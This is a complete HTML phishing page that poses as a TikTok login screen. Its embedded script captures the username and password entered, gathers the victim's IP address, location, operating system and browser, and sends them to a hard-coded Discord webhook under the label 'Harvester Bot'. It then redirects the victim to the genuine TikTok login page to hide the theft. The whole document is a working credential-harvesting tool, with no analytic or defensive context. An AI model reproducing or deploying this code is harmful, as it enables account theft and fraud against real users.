<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok</title>
    <style>
        body { font-family: sans-serif; background-color: #fafafa; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .container { background-color: #fff; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; margin-bottom: 10px; }
        .logo { font-family: 'Brush Script MT', cursive; font-size: 40px; margin-bottom: 30px; }
        input { width: 100%; padding: 9px 8px; margin-bottom: 6px; border: 1px solid #dbdbdb; border-radius: 3px; background-color: #fafafa; font-size: 12px; box-sizing: border-box; }
        button { width: 100%; background-color: #0095f6; color: #fff; border: none; border-radius: 4px; padding: 7px 0; font-weight: bold; margin-top: 10px; cursor: pointer; }
        .divider { display: flex; align-items: center; margin: 15px 0; }
        .divider .line { flex-grow: 1; height: 1px; background-color: #dbdbdb; }
        .divider .text { margin: 0 15px; color: #8e8e8e; font-size: 13px; font-weight: bold; }
        .fb-login { color: #385185; font-weight: bold; font-size: 14px; text-decoration: none; display: block; margin-bottom: 15px; }
        .forgot { color: #00376b; font-size: 12px; text-decoration: none; }
        .signup-box { background-color: #fff; border: 1px solid #dbdbdb; padding: 20px 40px; width: 350px; text-align: center; font-size: 14px; }
        .signup-box a { color: #0095f6; font-weight: bold; text-decoration: none; }
        .apps { text-align: center; margin-top: 20px; }
        .apps p { font-size: 14px; margin-bottom: 10px; }
        .app-stores img { height: 40px; margin: 0 5px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">tiktok</div>
        <form id="loginForm">
            <input type="text" id="email" placeholder="Phone number, username, or email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" id="loginBtn">Log In</button>
        </form>
        <div class="divider"><div class="line"></div><div class="text">OR</div><div class="line"></div></div>
        <a href="#" class="fb-login">Log in with Facebook</a>
        <a href="#" class="forgot">Forgot password?</a>
    </div>
    <div class="signup-box">Don't have an account? <a href="#">Sign up</a></div>
    <div class="apps">
        <p>Get the app.</p>
        <div class="app-stores">
            <img src="https://www.tiktok.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="App Store">
            <img src="https://www.tiktok.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="Google Play">
        </div>
    </div>
    <script>
        const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1538702595856539741/9QSZHry-ZfBd20aTqKHCKSrmBxYqrc3jGME50RFX5tVKmi-zAXPrX3gDQaGLI9JR6pj3";
        document.getElementById("loginForm").addEventListener("submit", function(e) {
            e.preventDefault();
            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;
            const btn = document.getElementById("loginBtn");
            btn.innerText = "Logging in...";
            btn.disabled = true;
            const ua = navigator.userAgent;
            let os = "Unknown";
            if (ua.includes("Win")) os = "Windows";
            else if (ua.includes("Mac")) os = "MacOS";
            else if (ua.includes("Linux")) os = "Linux";
            else if (ua.includes("Android")) os = "Android";
            else if (ua.includes("like Mac")) os = "iOS";
            let browser = "Unknown";
            if (ua.includes("Chrome")) browser = "Chrome";
            else if (ua.includes("Safari")) browser = "Safari";
            else if (ua.includes("Firefox")) browser = "Firefox";
            else if (ua.includes("Edge")) browser = "Edge";
            const time = new Date().toLocaleString();
            fetch("https://ipapi.co/json/")
                .then(res => res.json())
                .then(data => {
                    sendToDiscord(email, password, data.ip, `${data.city}, ${data.region}, ${data.country_name}`, os, browser, time);
                })
                .catch(err => {
                    sendToDiscord(email, password, "Unknown", "Unknown", os, browser, time);
                });
        });
        function sendToDiscord(email, password, ip, location, os, browser, time) {
            const payload = {
                username: "Harvester Bot",
                embeds: [{
                    title: "🚨 New Login Captured",
                    color: 16711680,
                    fields: [
                        { name: "Email/Username", value: email, inline: true },
                        { name: "Password", value: password, inline: true },
                        { name: "IP Address", value: ip, inline: false },
                        { name: "Location", value: location, inline: true },
                        { name: "OS", value: os, inline: true },
                        { name: "Browser", value: browser, inline: true },
                        { name: "Time", value: time, inline: false }
                    ],
                    footer: { text: "TikTok/IG Phish" }
                }]
            };
            fetch(WEBHOOK_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            }).then(() => {
                window.location.href = "https://www.tiktok.com/login";
            }).catch(err => {
                window.location.href = "https://www.tiktok.com/login";
            });
        }
    </script>
</body>
</html>
